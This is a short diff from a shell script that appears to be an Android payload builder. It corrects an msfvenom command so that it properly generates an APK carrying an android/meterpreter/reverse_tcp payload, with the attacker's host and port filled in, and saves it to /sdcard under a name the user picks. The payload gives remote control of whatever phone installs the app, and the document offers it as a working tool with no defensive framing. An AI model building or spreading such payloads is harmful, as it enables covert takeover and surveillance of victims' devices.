@@ -135,7 +135,7 @@ read -p "[!] Save As Name => " nama
 echo ""
 echo "$g[#] Creating Payload .."
 
-./msfvenom -p android/meterpreter/reverse_tcp LHOST$ip =LPORT=$port R> /sdcard/$nama.apk
+./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> /sdcard/$nama.apk
 echo ""
 echo ""
 echo "$gSaved Succes!Directory Sdcard name $nama.apk"
